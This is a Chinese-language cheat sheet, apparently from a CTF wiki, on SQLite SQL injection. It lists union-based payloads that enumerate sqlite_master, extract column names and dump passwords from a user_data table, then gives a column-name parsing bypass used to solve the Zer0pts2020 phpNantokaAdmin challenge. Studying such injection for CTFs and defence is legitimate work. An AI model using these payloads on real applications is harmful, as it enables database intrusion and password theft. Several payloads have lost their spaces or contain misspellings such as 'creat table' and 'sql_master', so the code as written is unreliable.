    sqlite¶

    SQLite 是一个软件库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。SQLite 是在世界上最广泛部署的 SQL 数据库引擎。SQLite 源代码不受版权限制。

    sqlite是轻量级的数据库，在开发的过程中会经常被使用，开发完成之后才转换为mysql

    sqlite_master¶

    sqlite_master表中保存数据库表的关键信息。

    从sqlite_master查表名:

    sqlite>selecttbl_namefromsqlite_masterwheretype='table';

    类似是mysql中的information-schema元数据库的信息。

    查版本。

    查表名和字段

    0' union select1,2,sqlite_version();
0' union select 1,2,sql from sqlite_master;
or
0' union select 1,2,sql from sqlite_masterwhere type='table';
or
0' union select 1,2,sqlfrom sqlite_master where type='table' and name='user_data';

    多条记录时可以使用group_concat聚合或者使用limit

    0' union select 1,2,group_concat(tbl_name)FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --

    或者使用limit来输出一行结果

    0' union select1,2,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like'sqlite_%' limit 2 offset 1 --

    另外可以通过下面的payload获取到格式化过的列名：

    0' union select1,2,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')+1)),instr((substr(sql,instr(sql,'(')+1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARYKEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOTNULL",''),",",'~~') from sqlite_master where type='table' andname='user_data' --

    查数据

    0' union selectid,name,passwd from user_data;

    使用group_concat连接查询结果

    0' union select1,2,group_concat(passwd) from user_data;

    在创建表时可以用as来复制另一个表中的数据。这里我们就可以用as select sql from sqlite_master来复制sqlite_master的sql字段。

    Sqlite bypass¶

    目前就碰到这一个，而且理解起来有点麻烦

    是sqlite自身的性质，通过闭合来强行拼凑出sql注入的语句。

    我们在使用sqlite_master时使用错误的语法，sqlite将会忽略后面列的名称，无论列的名称是否真实的存在，除非在列之间放置。

    select的时候，当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符

    []和'、"、`、一样可以包裹列名

    select [id][fdas3"`] from test

    //1

    select [id]"dgfsgfs" from test

    //1

    select [id]fdas from test

    //1

    第一个列名可以正常读取。第二个就会自动忽略

    " ' ` [] 都可以正常包裹列名

    insert语句也差不多

    $sql = "CREATE TABLE [aaa] as select [sql][ (dummy1TEXT, dummy2 TEXT, ]from sqlite_master; 2);";

    等于

    create table [aaa] as select sql from sqlite_master

    查找sqlite_master中sql列的值放入aaa表中

    creat table [aaa] as select sql as[dummy1TEXT, dummy2 TEXT(table_name传参内容)&columns[0][name]=]from sql_master;这里是第一种解释的方法

    [Zer0pts2020]phpNantokaAdmin¶

    这是一道sqlite注入的题目，考察点：我们在使用sqlite_master时使用错误的语法，sqlite将会忽略后面列的名称，无论列的名称是否真实的存在，除非在列之间放置。：

    table_name=[aaa] as select sql as[&columns[0][name]=]from sqlite_master;&columns[0][type]=2

    sql = "CREATE TABLE {table_name} (";

    $sql .= "dummy1 TEXT, dummy2 TEXT";

    挺神奇的，首先使用[aaa]来相当于覆盖掉sql.后的dummy1,dummy2，由于单次传递数据字符数量的限制，在[]中我们传递&columns来拼接传递超出字符的函数，但是在实际sqlite进行解析的时候，又由于在[]之后被忽略。最后相当于：

    creat table [aaa]as select sql from sqlite_master;

    creat table [aaa] as select sql as[dummy1 TEXT, dummy2 TEXT(table_name传参内容)&columns[0][name]=]from sql_master;

    找到另外一种解释:select的时候，当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符

    payload就为：[aaa]as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=2
